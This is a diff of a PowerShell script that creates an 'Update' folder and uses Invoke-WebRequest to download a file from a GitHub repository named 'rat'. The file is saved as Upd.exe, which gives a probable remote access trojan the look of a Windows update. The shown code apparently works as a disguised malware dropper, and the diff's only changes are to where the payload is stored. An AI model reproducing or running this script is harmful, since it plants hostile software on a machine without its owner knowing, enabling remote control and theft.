@@ -1,5 +1,7 @@
 cd\
-cd c:\windows
+md Update
+
+cd c:\Update
 
 $f1 = 'c:\windows\Upd.exe'
 if (Test-Path $f1) {
@@ -15,7 +17,7 @@ if ($f3) {
 }
 
 $url = "https://raw.githubusercontent.com/itarare/rat/master/Upd0001.txt"
-$output = "c:\windows\Upd.exe"
+$output = "c:\Update\windows\Upd.exe"
 $start_time = Get-Date
 
 Invoke-WebRequest -Uri $url -OutFile $output
